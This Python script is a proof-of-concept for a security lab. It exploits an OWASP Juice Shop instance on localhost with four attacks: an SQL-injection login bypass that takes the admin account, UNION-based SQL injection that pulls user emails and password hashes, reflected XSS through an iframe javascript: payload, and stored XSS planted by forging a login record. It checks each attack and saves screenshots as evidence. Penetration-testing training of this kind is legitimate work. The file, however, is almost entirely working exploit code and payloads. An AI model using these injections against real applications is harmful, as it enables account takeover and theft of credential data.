#!/usr/bin/env python3
"""
CS24/L Juice Shop Lab - Proof-of-Concept script for all 4 findings.

Exploits OWASP Juice Shop (http://localhost:3000) for:
  JUICE-001  SQL Injection  - login bypass (admin account takeover)
  JUICE-002  SQL Injection  - UNION-based data extraction via product search
  JUICE-003  XSS (Reflected) - DOM XSS via the search query parameter
  JUICE-004  XSS (Stored)    - persisted XSS via the login API (SQL injection
                                forges the lastLoginIp field with a raw
                                payload that later renders unescaped on the
                                "Last Login IP" privacy/security page)

For each finding this script performs the real HTTP/browser exploit against
a live local instance, confirms success programmatically (self-check), and
saves an evidence screenshot to screenshots/JUICE-00N.png.

Note on XSS screenshots: a native `alert()` dialog is browser chrome, not
page content, so Playwright's page.screenshot() never shows it even while it
is open. For JUICE-003/004 the script first proves the alert really fired
(via Playwright's dialog event, printed to the console) and only then
injects a visible on-page "XSS CONFIRMED" banner before taking the
screenshot, so the evidence image shows the vulnerable page itself plus a
truthful, post-hoc confirmation of what already happened.

Usage:
    python attacker_scripts/poc_all_findings.py

Requires: pip install playwright==1.56.0 && playwright install chromium
Authorized local training use only (OWASP Juice Shop, localhost:3000).
"""
from __future__ import annotations

import json
import os
import sys
import urllib.parse
import urllib.request

from playwright.sync_api import sync_playwright

BASE = "http://localhost:3000"
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SHOTS_DIR = os.path.join(ROOT, "screenshots")

DISMISS_SELECTORS = [
    'button[aria-label="Close Welcome Banner"]',
    '.cdk-overlay-container button:has-text("Dismiss")',
    'a[aria-label="dismiss cookie message"]',
    '.cc-dismiss',
]


def dismiss_overlays(page) -> None:
    """Close the welcome modal / cookie banner if present (best-effort)."""
    for _ in range(2):  # welcome banner can reappear briefly on first paint
        for sel in DISMISS_SELECTORS:
            try:
                page.locator(sel).first.click(timeout=1200)
            except Exception:
                pass
        page.wait_for_timeout(300)


def confirm_xss_banner(page, message: str) -> None:
    """Inject a visible on-page marker AFTER a real alert already fired."""
    page.evaluate(
        """(msg) => {
            const b = document.createElement('div');
            b.textContent = 'XSS CONFIRMED - alert() fired with message: ' + msg;
            b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:999999;'
                + 'background:#1b5e20;color:#fff;font:bold 16px monospace;'
                + 'padding:14px;text-align:center;border-bottom:4px solid #76ff03;';
            document.body.prepend(b);
        }""",
        message,
    )


def http_post_json(path: str, payload: dict) -> dict:
    """Minimal dependency-free JSON POST helper."""
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        BASE + path, data=data, headers={"Content-Type": "application/json"}, method="POST"
    )
    with urllib.request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def http_get_json(path: str) -> dict:
    with urllib.request.urlopen(BASE + path, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def require_target_up() -> None:
    try:
        urllib.request.urlopen(BASE, timeout=5)
    except Exception as exc:  # noqa: BLE001 - want a clear actionable message
        print(f"ERROR: Juice Shop is not reachable at {BASE} ({exc}).")
        print("Start it first:  docker compose up -d")
        sys.exit(1)


# ---------------------------------------------------------------------------
# JUICE-001: SQL Injection - login bypass
# ---------------------------------------------------------------------------
def exploit_001_login_bypass(page) -> None:
    payload = "' OR 1=1--"
    result = http_post_json("/rest/user/login", {"email": payload, "password": "doesnotmatter"})
    assert "authentication" in result, f"login bypass failed: {result}"
    token = result["authentication"]["token"]

    page.goto(f"{BASE}/#/login")
    dismiss_overlays(page)
    page.evaluate("(t) => localStorage.setItem('token', t)", token)
    page.goto(f"{BASE}/#/administration")
    page.wait_for_timeout(2500)
    dismiss_overlays(page)

    print(f"[JUICE-001] email payload: {payload!r}")
    print("[JUICE-001] forged admin JWT obtained; Administration page (admin-only) loaded.")
    page.screenshot(path=os.path.join(SHOTS_DIR, "JUICE-001.png"), full_page=True)
    print("[JUICE-001] screenshot saved -> screenshots/JUICE-001.png")


# ---------------------------------------------------------------------------
# JUICE-002: SQL Injection - UNION-based data extraction via search
# ---------------------------------------------------------------------------
def exploit_002_union_search(page) -> None:
    union_payload = (
        "qwert')) UNION SELECT id,email,password,'1','2','3','4','5','6' FROM Users--"
    )

    rest_url = "/rest/products/search?q=" + urllib.parse.quote(union_payload)
    data = http_get_json(rest_url)
    emails = [row.get("name", "") for row in data.get("data", []) if "@" in row.get("name", "")]
    assert emails, f"UNION injection did not leak user emails: {data}"
    print(f"[JUICE-002] leaked {len(emails)} user email/password-hash rows, e.g. {emails[0]}")

    # Show the raw leaked JSON (emails + password hashes) directly in the
    # browser - the clearest possible evidence of the data exfiltrated via
    # the UNION injection against GET /rest/products/search.
    page.goto(f"{BASE}{rest_url}")
    page.wait_for_timeout(1000)
    page.screenshot(path=os.path.join(SHOTS_DIR, "JUICE-002.png"), full_page=True)
    print("[JUICE-002] screenshot saved -> screenshots/JUICE-002.png")


# ---------------------------------------------------------------------------
# JUICE-003: Reflected XSS via search query
# ---------------------------------------------------------------------------
def exploit_003_reflected_xss(page) -> None:
    payload = "<iframe src=\"javascript:alert('XSS JUICE-003')\">"
    dialogs = []
    page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))

    page.goto(f"{BASE}/#/search?q={urllib.parse.quote(payload)}")
    dismiss_overlays(page)
    page.wait_for_timeout(2000)

    assert dialogs, "reflected XSS did not fire an alert"
    print(f"[JUICE-003] payload: {payload}")
    print(f"[JUICE-003] alert fired: {dialogs[0]}")

    confirm_xss_banner(page, dialogs[0])
    page.screenshot(path=os.path.join(SHOTS_DIR, "JUICE-003.png"), full_page=True)
    print("[JUICE-003] screenshot saved -> screenshots/JUICE-003.png")


# ---------------------------------------------------------------------------
# JUICE-004: Stored XSS via the login API (SQL injection forges lastLoginIp)
# ---------------------------------------------------------------------------
def exploit_004_stored_xss_via_login(page) -> None:
    xss = "<iframe src=\"javascript:alert(`xss`)\">"
    # UNION-based injection on the vulnerable login query forges an entire
    # fake "user" row. The forged row bypasses the normal Sequelize model
    # setter (which would sanitize this field on a real create/update), so
    # lastLoginIp is stored/returned completely raw inside the JWT.
    forged_email = (
        "x@x.com' UNION SELECT 1,'uname','a@a.com','pwd','admin','',"
        f"'{xss}','','',1,'2024-01-01 00:00:00','2024-01-01 00:00:00',NULL-- "
    )

    dialogs = []
    page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))

    page.goto(f"{BASE}/#/login")
    page.wait_for_selector("#email", timeout=8000)
    dismiss_overlays(page)

    page.fill("#email", forged_email)
    page.fill("#password", "x")
    page.click("#loginButton")
    page.wait_for_timeout(2000)

    page.goto(f"{BASE}/#/privacy-security/last-login-ip")
    dismiss_overlays(page)
    page.wait_for_timeout(2000)

    assert dialogs, "stored XSS via login API did not fire an alert"
    print(f"[JUICE-004] forged email (login SQLi): {forged_email}")
    print(f"[JUICE-004] alert fired on /#/privacy-security/last-login-ip: {dialogs[0]}")

    confirm_xss_banner(page, dialogs[0])
    page.screenshot(path=os.path.join(SHOTS_DIR, "JUICE-004.png"), full_page=True)
    print("[JUICE-004] screenshot saved -> screenshots/JUICE-004.png")


def main() -> None:
    require_target_up()
    os.makedirs(SHOTS_DIR, exist_ok=True)

    with sync_playwright() as pw:
        browser = pw.chromium.launch()
        try:
            for name, fn in (
                ("JUICE-001", exploit_001_login_bypass),
                ("JUICE-002", exploit_002_union_search),
                ("JUICE-003", exploit_003_reflected_xss),
                ("JUICE-004", exploit_004_stored_xss_via_login),
            ):
                page = browser.new_page()
                try:
                    fn(page)
                finally:
                    page.close()
        finally:
            browser.close()

    print("\nAll 4 findings exploited and screenshots saved to screenshots/.")


if __name__ == "__main__":
    main()
